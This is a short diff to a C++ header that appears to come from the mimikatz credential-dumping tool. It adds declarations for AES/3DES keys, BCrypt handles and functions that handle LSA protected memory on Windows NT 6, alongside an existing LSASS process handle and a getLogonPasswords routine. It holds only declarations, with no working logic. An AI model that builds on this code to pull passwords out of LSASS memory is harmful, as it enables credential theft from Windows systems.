@@ -45,14 +45,21 @@ private:
 
 	/* Crypto NT 5 */
 	static PBYTE *g_pRandomKey, *g_pDESXKey;
+	/* Crypto NT 6 */
+	static PBYTE DES3Key, AESKey;
+	static PKIWI_BCRYPT_KEY * hAesKey, * h3DesKey;
+	static BCRYPT_ALG_HANDLE * hAesProvider, * h3DesProvider;
 	
+	static bool LsaInitializeProtectedMemory_NT6();
+	static bool LsaCleanupProtectedMemory_NT6();
+
 	static bool population;
 	static vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
 	static bool getLogonPasswords(vector<wstring> * arguments);
 	static PVOID getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
 public:
 	static HANDLE hLSASS;
-	static HMODULE hLsaSrv;
+	static HMODULE hLsaSrv, hBCrypt;
 	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModLSASRV;
 	static PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;
 
